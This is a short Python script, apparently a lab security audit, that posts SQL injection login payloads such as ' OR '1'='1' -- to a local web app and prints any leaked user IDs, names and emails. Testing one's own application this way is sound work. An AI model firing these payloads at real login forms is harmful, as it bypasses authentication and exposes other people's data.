import requests
from datetime import datetime

URL = "http://localhost:5001/"

payloads = [

    {
        "nom": "Connexion normale invalide",
        "username": "admin",
        "password": "wrong_password"
    },
    {
        "nom": "Injection SQL simple",
        "username": "admin' -- ",
        "password": "ignored"
    },

    {
        "nom": "Injection OR TRUE",
        "username": "' OR '1'='1' -- ",
        "password": "ignored"
    }
]

print("\n===================================")
print(" AUDIT DE SECURITE - SQL INJECTION - Anh ")
print("===================================")
print(f"Date : {datetime.now()}")
print(f"Application : {URL}\n")

vulnerable = False

for test in payloads:

    print("-----------------------------------")
    print(f"Test : {test['nom']}")

    try:

        response = requests.post(
            URL,
            data={
                "username": test["username"],
                "password": test["password"]
            }
        )

        print("Status Code :", response.status_code)

        if "Connexion réussie" in response.text:

            print("[ALERTE] Connexion autorisée")

            if test["nom"] != "Connexion normale invalide":
                vulnerable = True

            for ligne in response.text.split("\n"):

                if "ID :" in ligne \
                   or "Utilisateur :" in ligne \
                   or "Email :" in ligne:

                    ligne = ligne.strip()
                    ligne = ligne.replace("<p>", "")
                    ligne = ligne.replace("</p>", "")

                    print("  >", ligne)

        else:
            print("[OK] Connexion refusée")

    except requests.exceptions.ConnectionError:
        print("Impossible de joindre l'application.")
        break

print("\n===================================")

if vulnerable:
    print("RESULTAT FINAL :")
    print("Application VULNERABLE à la SQL Injection.")
else:
    print("RESULTAT FINAL :")
    print("Aucune vulnérabilité détectée.")

print("===================================\n")